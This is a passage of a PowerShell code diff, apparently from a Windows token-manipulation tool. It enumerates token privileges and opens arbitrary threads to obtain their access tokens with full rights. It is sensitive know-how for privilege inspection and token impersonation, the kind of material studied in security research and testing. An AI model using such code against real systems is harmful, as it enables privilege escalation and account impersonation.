+                        if ($Enabled)
+                        {
+                            $ReturnObj.PrivilegesEnabled += ,$PrivilegeName
+                        }
+                        else
+                        {
+                            $ReturnObj.PrivilegesAvailable += ,$PrivilegeName
+                        }
+
+                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PrivilegeNamePtr)
+                    }
+                }
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
+
+            }
+            else
+            {
+                Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)"
+            }
+
+            #Free LogonSessionData
+            $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
+            $LogonSessionDataPtr = [IntPtr]::Zero
+            if ($ntstatus -ne 0)
+            {
+                Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $ntstatus"
+            }
+        }
+
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
+        $LuidPtr = [IntPtr]::Zero
+    }
+
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
+    $TokenStatsPtr = [IntPtr]::Zero
+
+    return $ReturnObj
+}
+
+#Used to add 64bit memory addresses
+Function Add-SignedIntAsUnsigned
+{
+	Param(
+	[Parameter(Position = 0, Mandatory = $true)]
+	[Int64]
+	$Value1,
+	
+	[Parameter(Position = 1, Mandatory = $true)]
+	[Int64]
+	$Value2
+	)
+	
+	[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
+	[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+	[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+
+	if ($Value1Bytes.Count -eq $Value2Bytes.Count)
+	{
+		$CarryOver = 0
+		for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
+		{
+			#Add bytes
+			[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
+
+			$FinalBytes[$i] = $Sum -band 0x00FF
+			
+			if (($Sum -band 0xFF00) -eq 0x100)
+			{
+				$CarryOver = 1
+			}
+			else
+			{
+				$CarryOver = 0
+			}
+		}
+	}
+	else
+	{
+		Throw "Cannot add bytearrays of different sizes"
+	}
+	
+	return [BitConverter]::ToInt64($FinalBytes, 0)
+}
+
+function Get-ThreadToken
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [UInt32]
+        $ThreadId
+    )
+
+    $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
+
+    $RetStruct = New-Object PSObject
+    [IntPtr]$hThreadToken = [IntPtr]::Zero
+
+    $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
+    if ($hThread -eq [IntPtr]::Zero)
+    {
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) #The thread probably no longer exists
+        {
+            Write-Warning "Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode"
+        }
+    }
+    else
+    {
+        $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
+        if (-not $Success)
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  #This error is returned when the thread isn't impersonated
+             ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) #Probably means the thread was closed
+            {
+                Write-Warning "Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode"
+            }
+        }
+        else
+        {
+            Write-Verbose "Successfully queried thread token"
+        }
+
+        #Close the handle to hThread (the thread handle)
+        if (-not $CloseHandle.Invoke($hThread))
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
+        }
+        $hThread = [IntPtr]::Zero
+    }
+
+    $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
+    return $RetStruct
+}
+
